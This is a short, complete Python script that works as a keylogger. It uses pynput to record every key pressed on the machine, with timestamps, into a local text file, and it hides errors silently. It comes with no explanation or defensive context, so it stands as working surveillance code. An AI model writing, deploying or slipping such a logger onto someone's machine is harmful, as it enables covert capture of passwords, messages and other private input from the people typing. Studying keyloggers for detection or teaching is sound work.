from pynput import keyboard
import time

log_file = 'keystrokes_log.txt'

def on_key_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {key}\n')
    except Exception as e:
        pass

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
